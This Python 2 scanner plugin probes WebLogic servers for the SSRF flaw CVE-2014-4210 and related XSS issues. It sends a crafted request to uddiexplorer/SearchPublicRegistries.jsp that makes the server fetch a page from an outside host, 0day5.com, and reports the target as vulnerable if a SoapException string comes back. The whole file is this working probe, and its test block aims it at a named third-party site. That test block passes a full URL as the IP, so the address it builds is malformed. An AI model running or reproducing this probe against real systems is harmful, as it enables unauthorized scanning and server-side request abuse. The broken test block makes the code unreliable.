from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#WebLogic SSRF And XSS (CVE-2014-4241, CVE-2014-4210, CVE-2014-4242)
#refer:http://blog.csdn.net/cnbird2008/article/details/45080055

import re
import urlparse


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = 'uddiexplorer/SearchPublicRegistries.jsp?operator=http://0day5.com/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'
        url = arg + payload
        code, head, res, errcode, _ = curl.curl('"%s"' % url)
        m = re.search('weblogic.uddi.client.structures.exception.XML_SoapException', res)
        if m:
            output(url,result,'warning')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  weblogic  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='SSRF And XSS Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/middle/weblogic/weblogic_2379ff4b3eb7712b2949f85115c62fce.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_2379ff4b3eb7712b2949f85115c62fce.py
#/root/github/poccreate/codesrc/exp-1424.py